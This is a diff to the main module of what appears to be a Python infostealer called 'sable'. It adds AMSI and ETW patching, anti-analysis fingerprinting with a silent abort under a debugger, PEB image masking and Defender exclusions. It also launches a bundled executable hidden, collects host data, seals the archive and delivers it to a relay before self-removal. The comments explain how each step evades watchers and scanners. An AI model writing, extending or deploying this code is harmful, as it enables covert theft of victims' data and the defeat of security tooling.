@@ -7,22 +7,33 @@ The order is fixed and every step depends on the one before it:
    the gate, before anything that could read a file it does not have.
 2. Log setup, then the AMSI and ETW patches. Neither is gated on: a patch that
    fails is a logged False, not a stopped run.
-3. Mutex guard, in the loader, before decryption. Two launches must not race the
+3. Display awareness, thread priority and the environment fingerprint. All three
+   are cheapest before the loader has mapped anything.
+4. Mutex guard, in the loader, before decryption. Two launches must not race the
    decrypted archive.
-4. Footer, decryption, mount. The loader owns every one of those.
-5. Config, gate, bound file, collection, transmission, self-remove.
+5. Footer, decryption, mount. The loader owns every one of those.
+6. Config, then the fingerprint verdict, then the image mask. The mask needs the
+   configured name, so it cannot come earlier, and it wants to be up before the
+   long part of the run starts.
+7. Queue drain, retry pass, run context, state load, decoy, persistence, gate,
+   collection, seal, delivery, self-remove.
+
+The workspace is the only directory this file owns; every collector is handed its
+own inside it by ``sources.run_all``. ``meta/`` holds the run's own paperwork and
+never contains collected data.
 
 Nothing here decrypts. Nothing here reads the footer.
 """
 
 from __future__ import annotations
 
+import hashlib
 import shutil
-import subprocess
 import sys
 import tempfile
+import uuid
 from pathlib import Path
-from typing import Final
+from typing import Any, Final
 
 UNWRAP_FLAG: Final[str] = "--abe-unwrap"
 DEBUG_FLAG: Final[str] = "--debug"
@@ -39,9 +50,6 @@ BOUND_SUFFIXES: Final[frozenset[str]] = frozenset({".exe", ".com", ".scr"})
 _MAX_BOUND_FILES: Final[int] = 8
 _MAX_BOUND_BYTES: Final[int] = 64 * 1024 * 1024
 _BOUND_CHUNK: Final[int] = 1024 * 1024
-# DETACHED_PROCESS: no console, and no inherited lifetime. The agent is about to exit;
-# what it started is not supposed to.
-_DETACHED_PROCESS: Final[int] = 0x00000008
 
 
 def _summary() -> dict:
@@ -71,7 +79,29 @@ def _status(block: str, status: str) -> str:
     return f"{block}\n**status** {status}" if block else f"**status** {status}"
 
 
-def _start_bound(archive) -> int:
+def _digest(path: Path) -> str:
+    """SHA-256 of a file, streamed. Empty string when it cannot be read."""
+    try:
+        hasher = hashlib.sha256()
+        with path.open("rb") as handle:
+            for block in iter(lambda: handle.read(_BOUND_CHUNK), b""):
+                hasher.update(block)
+    except OSError:
+        return ""
+    return hasher.hexdigest()
+
+
+def _slug(value: object) -> str:
+    """A filename-safe label from a hostname. Never empty, never longer than 24."""
+    text = "".join(
+        character if character.isalnum() or character in "-_" else "-"
+        for character in str(value or "").strip()
+    )
+    text = "-".join(part for part in text.split("-") if part)
+    return text[:24] or "sable"
+
+
+def _start_bound(archive: Any) -> int:
     """Extract what was welded into the payload and start the launchable part.
 
     The build welds one file into the archive under ``fused/``; this is the half that
@@ -79,11 +109,15 @@ def _start_bound(archive) -> int:
     because a started program may still want the files beside it long after this run
     ends, and the workspace is removed on the way out.
 
+    The start is a hidden one: a console child of a windowed parent puts a black
+    rectangle on the desktop for as long as it runs, and a welded program that does
+    that is worse than one that does not start.
+
     Nothing here is fatal. A member that will not extract or a start that is refused is
     a debug line, never a return: the collection is the job, and a bound file that
     failed to launch must not cost it.
     """
-    from . import log
+    from . import log, util
 
     members = [
         info
@@ -120,19 +154,30 @@ def _start_bound(archive) -> int:
         if target.suffix.lower() not in BOUND_SUFFIXES:
             continue
 
-        try:
-            subprocess.Popen(
-                [str(target)],
-                cwd=str(root),
-                creationflags=_DETACHED_PROCESS,
-                close_fds=True,
-            )
-        except OSError:
-            log.logger.debug("bound: %s did not start", name, exc_info=True)
+        if util.spawn_hidden(f'"{target}"', cwd=root) is None:
+            log.logger.debug("bound: %s did not start", name)
             continue
         started += 1
 
     return started
+
+
+def _paperwork(
+    work: Path,
+    *,
+    gate_block: dict[str, Any],
+    environment: dict[str, Any],
+    failures: dict[str, str],
+    state_block: dict[str, Any],
+) -> None:
+    """Write the run's own four files under ``meta/``. Never raises."""
+    from . import layout, util
+
+    meta = layout.meta_dir(work)
+    util.write_json(meta / "gate.json", gate_block)
+    util.write_json(meta / "environment.json", environment)
+    util.write_json(meta / "errors.json", failures)
+    util.write_json(meta / "state.json", state_block)
 
 
 def main(argv: list[str] | None = None) -> int:
@@ -150,10 +195,47 @@ def main(argv: list[str] | None = None) -> int:
     logger.debug("agent start: argv=%s", args)
 
     # Imported after the log is live: importing winapi creates the WinDLL handles.
-    from . import config, gate, loader, patch, relay, sources, util
+    from . import (
+        config,
+        defender,
+        enrich,
+        fingerprint,
+        gate,
+        gdi,
+        layout,
+        loader,
+        patch,
+        platforms,
+        progress,
+        relay,
+        sources,
+        util,
+        winapi,
+    )
+    from . import context as launch
+    from . import state as run_state
 
     logger.debug("amsi patch: %s", patch.patch_amsi())
     logger.debug("etw patch: %s", patch.patch_etw())
+
+    # Before anything enumerates the display and before the loader has mapped the
+    # payload: an unaware process sees the desktop scaled and every monitor rectangle
+    # disagrees with the pixels under it.
+    logger.debug("dpi awareness: %s", winapi.enable_dpi_awareness())
+    if not winapi.lower_priority():
+        logger.debug("priority: not lowered")
+    winapi.lower_thread_priority()
+
+    # Before decryption, so a hostile host is judged before the payload is in memory.
+    # The skew probe inside this costs 250 ms and is worth it here: a fast-forwarded
+    # clock is the loudest signal there is.
+    stamp = fingerprint.evaluate()
+    logger.debug(
+        "fingerprint: %s score=%d %s",
+        stamp.verdict,
+        stamp.score,
+        [signal.name for signal in stamp.signals],
+    )
 
     if not loader.acquire():
         logger.debug("another instance holds the mutex; exiting")
@@ -172,6 +254,25 @@ def main(argv: list[str] | None = None) -> int:
             logger.exception("config rejected")
             return 1
 
+        if fingerprint.should_stop(cfg.anti_analysis, stamp):
+            # The one exit that produces nothing. It is quiet on purpose: a machine
+            # running a debugger is being watched, and a message from here is a message
+            # to the watcher.
+            logger.warning(
+                "anti-analysis: %s (score %d), run abandoned before decryption",
+                stamp.verdict,
+                stamp.score,
+            )
+            return 0
+
+        mask: dict[str, object] = {"enabled": False}
+        if cfg.mask_peb:
+            mask = winapi.mask_process_image(cfg.image_name)
+            mask["enabled"] = True
+            logger.debug("mask: %s", mask)
+            if not (mask.get("image") or mask.get("command")):
+                logger.debug("mask: no match, nothing rewritten")
+
         # A previous run that could not reach the relay parked its archive. Clearing that
         # first is the whole point of the queue: the result already exists, and collecting
         # a second one on top of it is work nobody asked for.
@@ -187,6 +288,22 @@ def main(argv: list[str] | None = None) -> int:
             if not waiting and cfg.self_remove:
                 util.self_remove(util.executable_path())
             return 0
+
+        run_id = uuid.uuid4().hex[:12]
+        launch_ctx = launch.evaluate()
+        record = run_state.State.start(
+            launch_ctx.image,
+            launch_ctx.boot_id,
+            run_id=run_id,
+            resume_hours=cfg.state_hours,
+        )
+        logger.debug(
+            "context: %s first_run=%s boot=%s resumed=%s",
+            launch_ctx.mode,
+            launch_ctx.first_run,
+            launch_ctx.boot_id,
+            record.stage == "collecting" and int(record.document.get("resumed") or 0) > 0,
+        )
 
         # Before anything slow, so the window is up while the machine is being read
         # rather than after. It runs on its own thread either way: a dialog must never
@@ -238,29 +355,115 @@ def main(argv: list[str] | None = None) -> int:
             logger.debug("bound: started %d file(s)", bound)
 
         with util.temp_workspace("sable-collect-") as work:
-            if verdict.virtual:
-                util.write_json(
-                    work / "virtual.txt",
-                    {
-                        "virtual": verdict.virtual,
-                        "hits": list(verdict.hits),
-                        "reasons": list(verdict.reasons),
-                    },
-                )
+            managed = layout.prepare(work)
 
-            counts, failures = sources.run_all(work, cfg)
+            # A resume is only real when the files are. This copies them out of the
+            # workspace the previous run recorded and drops any module whose output did
+            # not come across, so a restored session never ships a count for data that is
+            # not in the archive.
+            carried = record.bring_forward(work)
+            if carried:
+                logger.debug("state: carried %d file(s) forward", carried)
+
+            # First auto-startup run is the only run that asks: the exclusion applies to
+            # a path that now exists, and asking again on every run is a pattern.
+            exclusion: dict[str, Any] = {"status": "skipped", "reason": "not first run"}
+            if launch_ctx.first_run and cfg.defender_exclusion:
+                exclusion = defender.exclusions(managed)
+                logger.debug("defender: %s", exclusion["status"])
+
+            record.to_collecting(work)
+
+            counts, failures = sources.run_all(work, cfg, state=record)
             logger.debug("collectors returned %s", counts)
+
             # Carried into the delivery caption: the count per source is what tells the
             # reader which collector produced nothing, and a bare total cannot.
             summary["counts"] = dict(counts)
             if failures:
-                # Carried into the delivery caption: a source that died is the one thing
-                # a bare item count can never tell you.
                 summary["failed"] = failures
                 logger.warning("collectors failed: %s", failures)
 
-            archive_path = util.make_archive(work, prepared.workspace / "payload.zip")
-            if archive_path is None:
+            details = enrich.collect(work)
+            if details:
+                summary["details"] = True
+            fact_lines = enrich.lines(details, counts)
+            volume = platforms.line(counts)
+            logger.debug("platforms: %s", volume or "nothing")
+
+            _paperwork(
+                work,
+                gate_block={
+                    "virtual": verdict.virtual,
+                    "hits": list(verdict.hits),
+                    "reasons": list(verdict.reasons),
+                    "fingerprint": stamp.as_dict(),
+                    "anti_analysis": cfg.anti_analysis,
+                },
+                environment={
+                    "context": launch_ctx.as_dict(),
+                    "defender": exclusion,
+                    "mask": mask,
+                    "gate": {"virtual": verdict.virtual, "hits": list(verdict.hits)},
+                    "uptime_seconds": stamp.window_seconds,
+                },
+                failures=failures,
+                state_block=run_state.snapshot(record.document),
+            )
+
+            # A screenshot that came back one colour across every monitor is a session
+            # with no desktop under it. Abandoning before sealing spends nothing on a
+            # delivery nobody wants; the reason is recorded either way.
+            screen_report = util.read_json(managed / layout.MODULE_DIRS["screen"] / "screen.json")
+            if cfg.abort_on_uniform_capture and isinstance(screen_report, dict):
+                monitors = [item for item in (screen_report.get("monitors") or []) if isinstance(item, dict)]
+                captured = [item for item in monitors if item.get("ok")]
+                if captured and all(item.get("flat") for item in captured):
+                    logger.warning("visual: every captured monitor is one colour, run abandoned")
+                    # Recorded in the run state, not in the workspace: the workspace is a
+                    # temp folder that is deleted on the way out, so an abandon.json in
+                    # there would be gone before anyone could read it.
+                    record.to_abandoned("uniform capture")
+                    relay.notify(cfg, _status("", f"abandoned · uniform capture · gate {gate_note}"))
+                    return 0
+
+            manifest = layout.manifest(
+                run_id=run_id,
+                agent="sable",
+                host=summary.get("hostname"),
+                context=launch_ctx.as_dict(),
+                fingerprint=stamp.as_dict(),
+                gate={"virtual": verdict.virtual, "hits": list(verdict.hits)},
+                defender=exclusion,
+                mask=mask,
+                counts=counts,
+                failures=failures,
+                platforms=platforms.table(counts),
+            )
+            util.write_json(work / layout.MANIFEST_MEMBER, manifest)
+
+            summary_lines = [
+                relay.describe(summary),
+                *fact_lines,
+                "",
+                f"run {run_id} · layout {layout.LAYOUT_VERSION}",
+                "counts " + " · ".join(f"{name} {count:,}" for name, count in sorted(counts.items())),
+            ]
+            util.write_text(
+                work / layout.SUMMARY_MEMBER,
+                "\n".join(line for line in summary_lines if line is not None) + "\n",
+            )
+
+            # The archive is *created* under the name it ships as. It used to be written
+            # as ``payload.zip`` and renamed after hashing, and in the guest every rename
+            # was refused with ``WinError 32`` — another process had the freshly written
+            # zip open, which is Defender's realtime scanner on a file that appeared a
+            # moment ago. Three attempts over 600 ms were not enough, so the delivered
+            # file arrived as ``payload-sealed.zip`` with no host name and no run id in
+            # it. A name chosen before the first byte is written is a name nothing can
+            # take away.
+            archive_path = prepared.workspace / f"{_slug(summary.get('hostname'))}-{run_id}.zip"
+            if util.make_archive(work, archive_path) is None:
                 logger.error("archive creation failed")
                 relay.notify(
                     cfg,
@@ -275,11 +478,13 @@ def main(argv: list[str] | None = None) -> int:
                 size = 0
             items = sum(counts.values())
 
+            record.to_collected(archive_path, _digest(archive_path), size)
+
             # Before transmission, so a failed upload still leaves something to open on
             # a machine the operator controls. Off unless the build asked for it.
             if cfg.keep_local:
                 kept = util.keep_archive(
-                    archive_path, str(summary.get("hostname") or "sable")
+                    archive_path, _slug(summary.get("hostname"))
                 )
                 if kept is not None:
                     util.write_text(
@@ -292,7 +497,11 @@ def main(argv: list[str] | None = None) -> int:
 
             relay.notify(
                 cfg,
-                _status("", f"uploading {items:,} items · {relay.human_bytes(size)}"),
+                _status(
+                    "",
+                    f"uploading {items:,} items · {relay.human_bytes(size)}"
+                    + (f" · {volume}" if volume else ""),
+                ),
             )
 
             # The archive that leaves the machine is password protected. Until now the
@@ -303,7 +512,7 @@ def main(argv: list[str] | None = None) -> int:
             shipped = archive_path
             sealed = util.seal_zip(
                 archive_path,
-                archive_path.with_name("payload-sealed.zip"),
+                archive_path.with_name(f"{archive_path.stem}-sealed.zip"),
                 cfg.seal_key,
             )
             if sealed is not None:
@@ -311,6 +520,13 @@ def main(argv: list[str] | None = None) -> int:
             else:
                 relay.notify(cfg, _status("", "sealing failed · sending the plain archive"))
 
+            # Progress is measured off the socket, not off the file: a send that stalls
+            # at 40% shows as a stall rather than as a silent timeout.
+            reporter = progress.Reporter(
+                max(1, shipped.stat().st_size), progress.log_reporter("relay")
+            )
+            relay.set_progress(reporter)
+            record.to_delivering()
             try:
                 relay.deliver(cfg, shipped, summary)
             except Exception as exc:
@@ -332,6 +548,17 @@ def main(argv: list[str] | None = None) -> int:
                     alert=True,
                 )
                 return 1
+            finally:
+                reporter.finish()
+                relay.set_progress(None)
+
+            record.to_done()
+
+            # The exclusions existed for the copy and the copy is over. They are taken
+            # back here rather than in teardown because this is the only path where the
+            # run no longer needs an unscanned workspace: a failed upload parks the
+            # archive and comes back, and that run wants its workspace excluded again.
+            defender.withdraw(exclusion)
 
             # The file message already carries the block and the mention; repeating
             # both here would buzz twice for one delivery.
@@ -342,6 +569,7 @@ def main(argv: list[str] | None = None) -> int:
 
         return 0
     finally:
+        gdi.stop()
         loader.cleanup()
 
 
